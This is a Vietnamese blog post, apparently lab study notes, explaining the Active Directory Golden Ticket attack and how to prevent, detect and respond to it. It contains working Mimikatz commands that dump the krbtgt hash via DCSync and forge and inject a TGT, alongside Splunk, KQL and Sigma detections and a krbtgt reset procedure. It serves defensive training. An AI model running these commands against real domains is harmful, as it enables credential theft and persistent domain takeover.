---
layout: post
title: "Golden Ticket"
date: 2026-07-12 22:32:42 +0700
categories: ["Windows Attacks & Defense"]
tags: [active-directory, windows-attacks-defense, kerberos, golden-ticket, krbtgt, mimikatz, dcsync, pass-the-ticket, event-4624, event-4625, event-4769, event-4675, splunk, elk, sigma, threat-hunting, incident-response, cdsa]
description: "Tóm tắt Golden Ticket trong Windows Attacks & Defense: vai trò của krbtgt, forged TGT, Mimikatz, prevention, detection theo hành vi và quy trình reset krbtgt hai lần."
toc: true
---

# Golden Ticket

Bài này thuộc module **Windows Attacks & Defense**, tập trung vào kỹ thuật **Golden Ticket** và cách phát hiện/phản ứng theo góc nhìn SOC/CDSA.

```text
Mục tiêu: hiểu vì sao hash của krbtgt cho phép forge TGT, tại sao đây là persistence cấp domain, và cách điều tra bằng authentication telemetry.
```

> Chỉ thực hành trong HTB, lab hoặc hệ thống có ủy quyền rõ ràng. Golden Ticket trên domain thật ngoài phạm vi cho phép là hành vi xâm nhập nghiêm trọng.

---

## Timeline cập nhật

```text
Created at: 2026-07-12 22:32:42 +0700
Timezone: Asia/Ho_Chi_Minh
Module: Windows Attacks & Defense
Section: Golden Ticket
Focus: krbtgt, forged TGT, Mimikatz, DCSync, Event ID 4624/4769/4675, krbtgt reset
```

---

# 1. Golden Ticket là gì?

**Golden Ticket** là forged Kerberos TGT được attacker tạo bằng secret/hash của account `krbtgt`.

Trong mỗi domain, `krbtgt` là account đặc biệt dùng để ký và xác thực Kerberos TGT.

Nếu attacker có hash hoặc Kerberos key của `krbtgt`, họ có thể tạo TGT giả nhưng vẫn được domain tin tưởng.

```text
Golden Ticket = persistence cấp domain.
```

---

# 2. Vì sao krbtgt quan trọng?

KDC trên Domain Controller dùng secret của `krbtgt` để:

- Ký TGT.
- Xác thực TGT.
- Bảo đảm ticket được phát hành bởi domain hợp lệ.

`krbtgt`:

- Được tạo mặc định khi domain được tạo.
- Bị disable.
- Không thể xóa.
- Không thể rename.
- Không dùng cho interactive logon.

---

# 3. Điều kiện để tạo Golden Ticket

Attacker thường cần:

```text
Domain name
Domain SID
krbtgt hash hoặc Kerberos key
Username hợp lệ
RID của user
```

Trong lab, attacker thường lấy `krbtgt` hash bằng DCSync.

---

# 4. Thu krbtgt bằng DCSync

Ví dụ Mimikatz trong lab:

```text
lsadump::dcsync /domain:eagle.local /user:krbtgt
```

Output sẽ trả:

- NTLM hash.
- AES256 key.
- AES128 key.
- RID 502.
- SID của account.

![Mimikatz DCSync krbtgt](/assets/img/windows-attacks-defense/golden-ticket/mimikatz-dcsync-krbtgt.png)

> Trong bài viết công khai nên luôn redacted các hash/key thật.

---

# 5. Lấy Domain SID

PowerView:

```powershell
. .\PowerView.ps1
Get-DomainSID
```

Ví dụ:

```text
S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx
```

---

# 6. Tạo Golden Ticket

Ví dụ Mimikatz trong lab:

```text
kerberos::golden
/domain:eagle.local
/sid:<DOMAIN_SID>
/rc4:<KRBTGT_HASH>
/user:Administrator
/id:500
/renewmax:7
/endin:8
/ptt
```

Ý nghĩa:

| Tham số | Mục đích |
|---|---|
| `/domain` | Tên domain |
| `/sid` | Domain SID |
| `/rc4` | NTLM hash của krbtgt |
| `/user` | User sẽ xuất hiện trong ticket |
| `/id` | RID của user |
| `/renewmax` | Thời gian tối đa có thể renew |
| `/endin` | Thời gian sống |
| `/ptt` | Inject ticket vào session hiện tại |

![Mimikatz Golden Ticket generated](/assets/img/windows-attacks-defense/golden-ticket/mimikatz-golden-ticket-generated.png)

---

# 7. Kiểm tra Ticket

Sau khi inject:

```cmd
klist
```

Cần thấy TGT cho:

```text
Client: Administrator @ eagle.local
Server: krbtgt/eagle.local @ eagle.local
```

Sau đó có thể kiểm tra quyền truy cập trong lab:

```cmd
dir \\dc1\c$
```

---

# 8. Vì sao Golden Ticket khó phát hiện?

Domain Controller không ghi log tại thời điểm ticket được forge trên máy attacker.

Log thường chỉ xuất hiện khi ticket được dùng để:

- Request TGS.
- Truy cập SMB.
- Đăng nhập vào host.
- Truy cập service Kerberos.

Do đó detection phải dựa vào hành vi sau khi forged ticket được sử dụng.

---

# 9. Prevention

Biện pháp quan trọng:

- Bảo vệ `krbtgt` secret như tài sản tối quan trọng.
- Giới hạn Domain Admin/Enterprise Admin.
- Dùng PAW cho privileged account.
- Không cho privileged user đăng nhập vào workstation thường.
- Audit DCSync rights.
- Monitor DCSync.
- Reset `krbtgt` định kỳ theo kế hoạch.
- Dùng SID filtering giữa domain/forest phù hợp.
- Hạn chế RC4 và ưu tiên AES.
- Review delegation và SIDHistory.
- Bảo vệ DC khỏi credential dumping.

---

# 10. Reset krbtgt đúng cách

Nếu nghi `krbtgt` bị compromise:

```text
Reset lần 1
Chờ replication hoàn tất
Chờ tối thiểu bằng maximum ticket lifetime
Reset lần 2
```

Lý do phải reset hai lần:

```text
krbtgt giữ hai password gần nhất trong history.
Reset hai lần mới loại bỏ hoàn toàn old key.
```

Trong nhiều môi trường, nên chờ ít nhất 10 giờ giữa hai lần reset để giảm nguy cơ làm hỏng authentication/session hợp lệ.

Module tham chiếu script:

```text
New-KrbtgtKeys.ps1
```

Nên chạy audit mode trước khi thay đổi production.

---

# 11. Detection bằng Event ID 4624 và 4625

Golden Ticket sử dụng có thể tạo:

```text
4624 - Successful logon
4625 - Failed logon
```

Hunt theo:

- Privileged account từ non-PAW.
- Source IP bất thường.
- Logon Type không phù hợp.
- Logon ngoài giờ.
- Account không có logon history tương tự.

Splunk:

```spl
index=wineventlog sourcetype=WinEventLog:Security
EventCode IN (4624,4625)
Account_Name="Administrator"
| stats count values(Logon_Type) as logon_types values(host) as targets by Source_Network_Address
| sort - count
```

---

# 12. Detection bằng Event ID 4769

Khi forged TGT được dùng để request service ticket:

```text
Event ID 4769 - A Kerberos service ticket was requested
```

Hunt theo:

- TGS request không có TGT request trước đó.
- Privileged user request service từ source lạ.
- Ticket lifetime bất thường.
- RC4 trong môi trường chỉ dùng AES.
- Nhiều service ticket trong thời gian ngắn.

Splunk:

```spl
index=wineventlog sourcetype=WinEventLog:Security EventCode=4769
Account_Name="Administrator"
| stats count dc(Service_Name) as unique_services values(Service_Name) as services by Client_Address
| sort - count
```

---

# 13. Detection bằng Event ID 4675

Nếu SID filtering được bật, cross-domain abuse có thể tạo:

```text
Event ID 4675 - SIDs were filtered
```

Đây là signal quan trọng khi attacker abuse `SIDHistory` để leo từ child domain lên parent domain.

---

# 14. Golden Ticket behavioral correlation

Một correlation thực tế:

```text
Không thấy 4768 hợp lệ cho user/source
        ↓
Xuất hiện 4769 cho nhiều service
        ↓
4624 privileged logon từ non-PAW
        ↓
SMB/WinRM/RDP access tới nhiều host
```

Đây không phải bằng chứng tuyệt đối, nhưng là pattern rất đáng điều tra.

---

# 15. Splunk Hunting Query

```spl
index=wineventlog sourcetype=WinEventLog:Security
(EventCode=4624 OR EventCode=4768 OR EventCode=4769)
| eval src=coalesce(Source_Network_Address,Client_Address)
| bin _time span=10m
| stats values(EventCode) as events
        dc(Service_Name) as service_count
        values(Service_Name) as services
        values(host) as hosts
  by _time, Account_Name, src
| where service_count >= 5 OR mvcount(events) >= 2
```

---

# 16. ELK/KQL

Privileged successful logon:

```kql
event.code: "4624" and user.name: "Administrator"
```

TGS request:

```kql
event.code: "4769" and user.name: "Administrator"
```

SID filtering:

```kql
event.code: "4675"
```

---

# 17. Sigma Rule

```yaml
title: Suspicious Privileged Kerberos Ticket Activity
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID:
      - 4624
      - 4769
    TargetUserName:
      - Administrator
      - krbtgt
  condition: selection
falsepositives:
  - Approved privileged administration
level: high
```

Nên kết hợp allowlist PAW, jump hosts và DC subnets.

---

# 18. Incident Response Checklist

```text
[ ] Xác định source host sử dụng ticket.
[ ] Xác định account bị impersonate.
[ ] Kiểm tra 4624, 4625, 4768, 4769, 4675.
[ ] Hunt DCSync trước đó bằng Event 4662.
[ ] Tìm Mimikatz/credential dumping artifacts.
[ ] Isolate source host.
[ ] Rotate credential đặc quyền.
[ ] Reset krbtgt hai lần theo kế hoạch.
[ ] Review certificates và revoke nếu forest compromise.
[ ] Hunt Golden Ticket persistence toàn domain.
[ ] Kiểm tra SIDHistory và trust abuse.
```

---

# 19. Nếu Forest bị compromise

Xử lý nghiêm trọng hơn:

- Reset toàn bộ privileged credentials.
- Reset `krbtgt` hai lần trong từng domain.
- Review all trusts.
- Revoke certificates nếu AD CS bị ảnh hưởng.
- Rotate service account credentials.
- Rebuild/restore DC nếu cần.
- Hunt persistence trên endpoint/server.
- Kiểm tra Golden Ticket, Silver Ticket và DCSync.

---

# 20. Mapping với CDSA

## Security Operations & Monitoring

- Thu 4624, 4625, 4768, 4769, 4675.
- Baseline PAW và privileged source.
- Correlate TGT/TGS/logon behavior.
- Monitor DCSync precursor.

## Incident Response & Forensics

- Triage source host.
- Phân tích memory với Volatility nếu cần.
- Tìm Mimikatz/LSASS artifacts.
- Xác định phạm vi credential compromise.
- Thực hiện krbtgt reset plan.

## Threat Hunting

- Hunt privileged logon ngoài PAW.
- Hunt TGS không có TGT hợp lý trước đó.
- Hunt abnormal ticket lifetimes.
- Hunt RC4 usage và SIDHistory abuse.

## Detection Engineering

- Sigma cho privileged ticket activity.
- Splunk/Elastic correlation.
- Allowlist PAW/jump host.
- Correlate 4662 → 4769 → 4624.

---

# 21. Lab Setup

Môi trường tối thiểu:

```text
1 Domain Controller
1 Windows workstation
1 Splunk/ELK/Wazuh server
Sysmon + Windows Event Forwarding/agent
```

Log nên thu:

```text
Security: 4624, 4625, 4662, 4675, 4768, 4769, 4688
Sysmon: 1, 3, 10
PowerShell Operational
```

---

# Key Takeaway

```text
Golden Ticket cần secret của krbtgt.
Golden Ticket cho phép forge TGT hợp lệ và persistence cấp domain.
DC không log thời điểm forge ticket, chỉ log khi ticket được sử dụng.
Detection phải dựa vào behavior: 4624, 4769, PAW baseline và DCSync precursor.
Nếu krbtgt bị lộ, phải reset hai lần theo kế hoạch.
```

Golden Ticket là một trong những tình huống nghiêm trọng nhất trong AD incident response vì có thể duy trì quyền kiểm soát ngay cả sau khi một số password khác đã được thay đổi.
